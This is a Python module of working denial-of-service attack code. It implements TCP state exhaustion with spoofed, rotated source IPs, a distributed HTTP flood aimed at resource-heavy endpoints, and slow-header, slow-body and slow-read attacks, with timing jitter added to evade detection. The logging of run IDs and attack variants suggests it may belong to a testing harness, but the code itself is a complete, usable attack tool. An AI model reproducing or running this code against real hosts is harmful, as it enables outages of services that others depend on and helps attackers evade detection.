"""
Advanced Attack Techniques Module

This module implements sophisticated DDoS attack techniques including
TCP state exhaustion and distributed application layer attacks.
"""

import time
import random
import socket
import logging
import requests
from scapy.all import IP, TCP, ICMP, sr1, send

try:
    from .packet_crafting import PacketCrafter
except ImportError:
    from packet_crafting import PacketCrafter

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


class AdvancedTechniques:
    """Advanced DDoS attack techniques implementation."""
    
    def __init__(self, ip_rotator):
        """
        Initialize advanced techniques with IP rotator.
        
        Args:
            ip_rotator: IPRotator instance for source IP management
        """
        self.ip_rotator = ip_rotator
        self.packet_crafter = PacketCrafter()
        self.target_info = {}
        self.session_tokens = {}
    
    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=2, duration=5, run_id="", attack_variant=""):
        """
        Advanced TCP state exhaustion attack that manipulates sequence numbers
        and window sizes to keep connections half-open but valid.
        
        Args:
            dst: Target IP address
            dport: Target port (default: 80)
            num_packets_per_sec: Target packet rate
            duration: Attack duration in seconds
            run_id: Unique identifier for this attack run
            attack_variant: Type of attack variant
        
        Returns:
            dict: Attack statistics and results
        """
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: TCP State Exhaustion - Target: {dst}:{dport}, Duration: {duration}s")
        
        # Pre-attack connectivity test
        connectivity_start = time.time()
        try:
            test_packet = IP(dst=dst)/ICMP()
            ping_reply = sr1(test_packet, timeout=2, verbose=0)
            connectivity_time = time.time() - connectivity_start
            if ping_reply:
                attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Target {dst} is reachable (ping: {connectivity_time:.3f}s)")
            else:
                attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Target {dst} not responding to ping (timeout: {connectivity_time:.3f}s)")
        except Exception as e:
            connectivity_time = time.time() - connectivity_start  
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Connectivity test failed for {dst}: {e} (time: {connectivity_time:.3f}s)")
        
        # Test target service availability
        service_start = time.time()
        try:
            test_syn = IP(dst=dst)/TCP(dport=dport, flags="S")
            service_reply = sr1(test_syn, timeout=2, verbose=0)
            service_time = time.time() - service_start
            if service_reply and service_reply.haslayer(TCP):
                tcp_flags = service_reply.getlayer(TCP).flags
                if tcp_flags & 0x12:  # SYN+ACK
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Service {dst}:{dport} is active (SYN-ACK: {service_time:.3f}s)")
                elif tcp_flags & 0x04:  # RST
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Service {dst}:{dport} rejected connection (RST: {service_time:.3f}s)")
                else:
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Service {dst}:{dport} unexpected response (flags={tcp_flags}: {service_time:.3f}s)")
            else:
                attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Service {dst}:{dport} not responding (timeout: {service_time:.3f}s)")
        except Exception as e:
            service_time = time.time() - service_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Service test failed for {dst}:{dport}: {e} (time: {service_time:.3f}s)")
        
        # Track sequence numbers for more sophisticated sequence prediction
        seq_base = random.randint(1000000, 9000000)
        
        end_time = time.time() + duration
        sent_packets = 0
        received_packets = 0
        rst_packets = 0
        timeout_packets = 0
        packet_count = 0
        start_time = time.time()
        last_log_time = start_time
        
        # Burst mechanism parameters
        burst_size = max(1, int(num_packets_per_sec / 10))  # Send 10% of target PPS in a burst
        burst_interval = 0.1  # Time between bursts
        
        while time.time() < end_time:
            burst_start_time = time.time()
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Starting burst of {burst_size} packets")
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                src = self.ip_rotator.get_random_ip()
                sport = random.randint(1024, 65535)
                seq = seq_base + (sent_packets * 1024)
                
                # Sophisticated manipulation of TCP window size
                window = random.randint(16384, 65535)
                
                # Send SYN packet to initiate connection
                syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
                                                     flags="S", seq=seq, window=window)
                
                # Send and wait for SYN-ACK
                sent_packets += 1
                packet_count += 1  # Increment packet_count for every attempted send
                try:
                    packet_start_time = time.time()
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Attempting to send SYN packet from {src}:{sport} to {dst}:{dport}")
                    reply = sr1(syn_packet, timeout=1, verbose=0)  # Increased timeout to 1 second
                    packet_end_time = time.time()
                    packet_duration = packet_end_time - packet_start_time
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] SYN packet sent in {packet_duration:.3f}s. Reply: {reply}")
                    
                    if reply and reply.haslayer(TCP):
                        received_packets += 1
                        tcp_layer = reply.getlayer(TCP)
                        if tcp_layer.flags & 0x12:  # SYN+ACK
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received SYN-ACK from {dst}:{dport}. Sending ACK.")
                            # Extract server sequence number and acknowledge it
                            server_seq = tcp_layer.seq
                            ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
                                                                 flags="A", seq=seq+1, 
                                                                 ack=server_seq+1, window=window)
                            send(ack_packet, verbose=0)  # verbose=0 to reduce console output
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] ACK packet sent. Established half-open connection from {src}:{sport}")
                            # After establishing connection, don't continue with data transfer
                            # This keeps connection half-open, consuming resources on target
                            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Established half-open connection from {src}:{sport}")
                        elif tcp_layer.flags & 0x04:  # RST flag
                            rst_packets += 1
                            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Received RST from {dst}:{dport} for {src}:{sport}. Connection reset by server.")
                        else:
                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received unexpected TCP flags: {tcp_layer.flags} for {src}:{sport}.")
                    else:
                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] No TCP reply or invalid reply for {src}:{sport}.")
                except socket.timeout:
                    timeout_packets += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Timeout: No reply received for SYN from {src}:{sport} to {dst}:{dport}.")
                except Exception as e:
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error during TCP state exhaustion from {src}:{sport}: {e}")
                    pass
                
                packet_count += 1
            
            burst_end_time = time.time()
            burst_duration = burst_end_time - burst_start_time
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst completed in {burst_duration:.3f}s")
            
            current_time = time.time()
            if current_time - last_log_time >= 1.0:  # Log every second
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_pps = packet_count / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_pps:.2f} packets/sec, Total sent = {packet_count}")
                last_log_time = current_time
            
            # Add jitter to avoid detection based on timing patterns
            sleep_duration = random.uniform(burst_interval * 0.8, burst_interval * 1.2)
            sleep_start_time = time.time()
            time.sleep(sleep_duration)  # Jittered sleep between bursts
            actual_sleep_time = time.time() - sleep_start_time
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst sleep: planned={sleep_duration:.3f}s, actual={actual_sleep_time:.3f}s")
        
        total_elapsed_time = time.time() - start_time
        warning_message = None
        if total_elapsed_time > 0:
            average_pps = packet_count / total_elapsed_time
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total packets sent = {packet_count}, Average rate = {average_pps:.2f} packets/sec.")
            expected_packets = num_packets_per_sec * duration
            if packet_count < (expected_packets * 0.3):  # Warning if less than 30% of expected for adversarial attacks
                warning_message = f"Low packet count ({packet_count}) for expected duration ({duration}s) and rate ({num_packets_per_sec} pps). Expected ~{expected_packets} packets."
        else:
            average_pps = 0
            warning_message = "Attack duration too short or no packets sent."
        
        return {
            "total_sent": sent_packets, 
            "total_received": received_packets, 
            "total_rst": rst_packets, 
            "total_timeout": timeout_packets, 
            "average_rate": average_pps, 
            "type": "packets", 
            "warning_message": warning_message
        }
    
    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=6, duration=5, run_id="", attack_variant=""):
        """
        Advanced application layer attack that mimics legitimate HTTP traffic
        but targets resource-intensive endpoints.
        
        Args:
            dst: Target IP address
            dport: Target port (default: 80)
            num_requests_per_sec: Target request rate
            duration: Attack duration in seconds
            run_id: Unique identifier for this attack run
            attack_variant: Type of attack variant
        
        Returns:
            dict: Attack statistics and results
        """
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Distributed Application Layer - Target: {dst}:{dport}, Duration: {duration}s")
        
        # Pre-attack HTTP service test
        http_test_start = time.time()
        try:
            import requests
            test_url = f"http://{dst}:{dport}/"
            test_response = requests.get(test_url, timeout=3)
            http_test_time = time.time() - http_test_start
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} is active (status: {test_response.status_code}, time: {http_test_time:.3f}s)")
        except requests.exceptions.Timeout:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} timeout (time: {http_test_time:.3f}s)")
        except requests.exceptions.ConnectionError as e:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} connection error: {e} (time: {http_test_time:.3f}s)")
        except Exception as e:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service test failed for {dst}:{dport}: {e} (time: {http_test_time:.3f}s)")
        
        # Resource-intensive endpoints that might cause server strain
        resource_heavy_paths = [
            "/search?q=" + "a" * random.randint(50, 100),
            "/api/products?page=1&size=100&sort=price",
            "/api/users/verify?token=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64)),
            "/download?file=large_report.pdf",
            "/images/highres_" + str(random.randint(1000, 9999)) + ".jpg"
        ]
        
        end_time = time.time() + duration
        sent_requests = 0
        successful_requests = 0
        failed_requests = 0
        timeout_requests = 0
        start_time = time.time()
        last_log_time = start_time
        
        # Burst mechanism parameters
        burst_size = max(1, int(num_requests_per_sec / 10))  # Send 10% of target RPS in a burst
        burst_interval = 0.1  # Time between bursts
        
        while time.time() < end_time:
            burst_start_time = time.time()
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Starting burst of {burst_size} HTTP requests")
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                src = self.ip_rotator.get_random_ip()
                
                # Select a resource-heavy path
                path = random.choice(resource_heavy_paths)
                
                # Choose random HTTP method
                method = random.choice(self.packet_crafter.http_methods)

                # Create HTTP headers
                user_agent = random.choice(self.packet_crafter.user_agents)
                headers = dict(self.packet_crafter.common_headers)
                headers["User-Agent"] = user_agent
                headers["Host"] = dst
                
                # Sometimes add cookies to appear more legitimate
                if random.random() > 0.5:
                    import os
                    headers["Cookie"] = f"session_id={os.urandom(16).hex()}; user_pref=dark_mode"
                
                session = requests.Session()
                session.headers.update(headers)

                sent_requests += 1
                try:
                    request_start_time = time.time()
                    if method == "GET":
                        response = session.get(f"http://{dst}:{dport}{path}", timeout=2)
                    elif method == "POST":
                        # For POST, include some dummy data
                        data = {"param1": "value1", "param2": "value2"}
                        response = session.post(f"http://{dst}:{dport}{path}", data=data, timeout=2)
                    elif method == "HEAD":
                        response = session.head(f"http://{dst}:{dport}{path}", timeout=2)
                    elif method == "OPTIONS":
                        response = session.options(f"http://{dst}:{dport}{path}", timeout=2)
                    
                    request_end_time = time.time()
                    response_time = (request_end_time - request_start_time) * 1000  # in ms
                    
                    successful_requests += 1
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] App Layer: {method} request to {dst}:{dport}{path} from {src} - Status: {response.status_code}, Time: {response_time:.2f}ms")
                    
                except requests.exceptions.Timeout:
                    timeout_requests += 1
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Timeout for {method} request to {dst}:{dport}{path} from {src}")
                except requests.exceptions.ConnectionError as e:
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Connection Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
                except Exception as e:
                    failed_requests += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Unexpected Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
                
            burst_end_time = time.time()
            burst_duration = burst_end_time - burst_start_time
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst completed in {burst_duration:.3f}s")
                
            current_time = time.time()
            if current_time - last_log_time >= 1.0:  # Log every second
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_rps = sent_requests / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_rps:.2f} requests/sec, Total sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}")
                last_log_time = current_time
            
            # Variable timing to avoid detection
            sleep_duration = random.uniform(burst_interval * 0.8, burst_interval * 1.2)
            sleep_start_time = time.time()
            time.sleep(sleep_duration)  # Jittered sleep between bursts
            actual_sleep_time = time.time() - sleep_start_time
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst sleep: planned={sleep_duration:.3f}s, actual={actual_sleep_time:.3f}s")
        
        total_elapsed_time = time.time() - start_time
        warning_message = None
        if total_elapsed_time > 0:
            average_rps = sent_requests / total_elapsed_time
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total requests sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}, Average rate = {average_rps:.2f} requests/sec.")
            expected_requests = num_requests_per_sec * duration
            if sent_requests < (expected_requests * 0.3):  # Warning if less than 30% of expected for adversarial attacks
                warning_message = f"Low request count ({sent_requests}) for expected duration ({duration}s) and rate ({num_requests_per_sec} rps). Expected ~{expected_requests} requests."
        else:
            average_rps = 0
            warning_message = "Attack duration too short or no requests sent."
        
        return {
            "total_sent": sent_requests, 
            "total_successful": successful_requests, 
            "total_failed": failed_requests, 
            "total_timeout": timeout_requests, 
            "average_rate": average_rps, 
            "type": "requests", 
            "warning_message": warning_message
        }
    
    def advanced_slow_http_attack(self, dst, dport=80, num_connections_per_sec=2, duration=5, run_id="", attack_variant=""):
        """
        Advanced slow HTTP attack with IP rotation, burst patterns, and sophisticated timing.
        Implements slow header, slow body, and slow read techniques.
        
        Args:
            dst: Target IP address
            dport: Target port (default: 80)
            num_connections_per_sec: Target connection rate
            duration: Attack duration in seconds
            run_id: Unique identifier for this attack run
            attack_variant: Type of attack variant
        
        Returns:
            dict: Attack statistics and results
        """
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Advanced Slow HTTP - Target: {dst}:{dport}, Duration: {duration}s")
        
        # Pre-attack HTTP service test
        http_test_start = time.time()
        try:
            import requests
            test_url = f"http://{dst}:{dport}/"
            test_response = requests.get(test_url, timeout=3)
            http_test_time = time.time() - http_test_start
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} is active (status: {test_response.status_code}, time: {http_test_time:.3f}s)")
        except requests.exceptions.Timeout:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} timeout (time: {http_test_time:.3f}s)")
        except requests.exceptions.ConnectionError as e:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} connection error: {e} (time: {http_test_time:.3f}s)")
        except Exception as e:
            http_test_time = time.time() - http_test_start
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service test failed for {dst}:{dport}: {e} (time: {http_test_time:.3f}s)")
        
        end_time = time.time() + duration
        sent_connections = 0
        successful_connections = 0
        failed_connections = 0
        timeout_connections = 0
        active_connections = []
        start_time = time.time()
        last_log_time = start_time
        
        # Burst mechanism parameters
        burst_size = max(1, int(num_connections_per_sec / 10))  # Send 10% of target CPS in a burst
        burst_interval = 0.1  # Time between bursts
        
        # Slow HTTP attack techniques
        slow_techniques = ['slow_headers', 'slow_body', 'slow_read']
        
        while time.time() < end_time:
            burst_start_time = time.time()
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Starting burst of {burst_size} slow HTTP connections")
            
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                
                src = self.ip_rotator.get_random_ip()
                technique = random.choice(slow_techniques)
                
                sent_connections += 1
                try:
                    connection_start_time = time.time()
                    
                    if technique == 'slow_headers':
                        success = self._slow_headers_attack(dst, dport, src, run_id, attack_variant)
                    elif technique == 'slow_body':
                        success = self._slow_body_attack(dst, dport, src, run_id, attack_variant)
                    elif technique == 'slow_read':
                        success = self._slow_read_attack(dst, dport, src, run_id, attack_variant)
                    
                    connection_end_time = time.time()
                    connection_duration = connection_end_time - connection_start_time
                    
                    if success:
                        successful_connections += 1
                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP {technique} from {src} succeeded (time: {connection_duration:.3f}s)")
                    else:
                        failed_connections += 1
                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP {technique} from {src} failed (time: {connection_duration:.3f}s)")
                        
                except socket.timeout:
                    timeout_connections += 1
                    failed_connections += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP timeout from {src}")
                except Exception as e:
                    failed_connections += 1
                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP error from {src}: {e}")
            
            burst_end_time = time.time()
            burst_duration = burst_end_time - burst_start_time
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst completed in {burst_duration:.3f}s")
            
            current_time = time.time()
            if current_time - last_log_time >= 1.0:  # Log every second
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_cps = sent_connections / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connection rate: {current_cps:.2f} connections/sec, Total sent = {sent_connections}")
                last_log_time = current_time
            
            # Add jitter to avoid detection based on timing patterns
            sleep_duration = random.uniform(burst_interval * 0.8, burst_interval * 1.2)
            time.sleep(sleep_duration)
        
        # Calculate final statistics
        total_duration = time.time() - start_time
        if total_duration > 0:
            average_cps = sent_connections / total_duration
            warning_message = None
        else:
            average_cps = 0
            warning_message = "Attack duration too short or no connections sent."
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Advanced Slow HTTP attack completed:")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total connections: {sent_connections}, Successful: {successful_connections}, Failed: {failed_connections}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Average rate: {average_cps:.2f} connections/sec")
        
        return {
            "total_sent": sent_connections, 
            "total_successful": successful_connections, 
            "total_failed": failed_connections, 
            "total_timeout": timeout_connections, 
            "average_rate": average_cps, 
            "type": "connections", 
            "warning_message": warning_message
        }
    
    def _slow_headers_attack(self, dst, dport, src, run_id, attack_variant):
        """Send HTTP headers very slowly to keep connection alive."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((dst, dport))
            
            # Send partial HTTP request slowly
            request_parts = [
                f"GET / HTTP/1.1\r\n",
                f"Host: {dst}\r\n",
                f"User-Agent: {random.choice(self.packet_crafter.user_agents)}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Connection: keep-alive\r\n"
            ]
            
            for part in request_parts:
                sock.send(part.encode())
                time.sleep(random.uniform(0.5, 2.0))  # Slow header sending
            
            # Keep connection alive by not sending final \r\n
            time.sleep(random.uniform(1.0, 3.0))
            sock.close()
            return True
            
        except Exception as e:
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow headers error from {src}: {e}")
            return False
    
    def _slow_body_attack(self, dst, dport, src, run_id, attack_variant):
        """Send HTTP body very slowly after complete headers."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((dst, dport))
            
            # Send complete headers with Content-Length
            body_data = "x" * 1000  # 1KB of data
            headers = f"POST / HTTP/1.1\r\nHost: {dst}\r\nContent-Length: {len(body_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
            sock.send(headers.encode())
            
            # Send body data very slowly
            for char in body_data:
                sock.send(char.encode())
                time.sleep(random.uniform(0.01, 0.1))  # Very slow body sending
            
            sock.close()
            return True
            
        except Exception as e:
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow body error from {src}: {e}")
            return False
    
    def _slow_read_attack(self, dst, dport, src, run_id, attack_variant):
        """Send complete request but read response very slowly."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((dst, dport))
            
            # Send complete HTTP request
            request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: {random.choice(self.packet_crafter.user_agents)}\r\nConnection: keep-alive\r\n\r\n"
            sock.send(request.encode())
            
            # Read response very slowly
            response_data = b""
            for _ in range(50):  # Try to read 50 times
                try:
                    chunk = sock.recv(1)  # Read only 1 byte at a time
                    if chunk:
                        response_data += chunk
                        time.sleep(random.uniform(0.1, 0.5))  # Slow reading
                    else:
                        break
                except socket.timeout:
                    break
            
            sock.close()
            return True
            
        except Exception as e:
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow read error from {src}: {e}")
            return False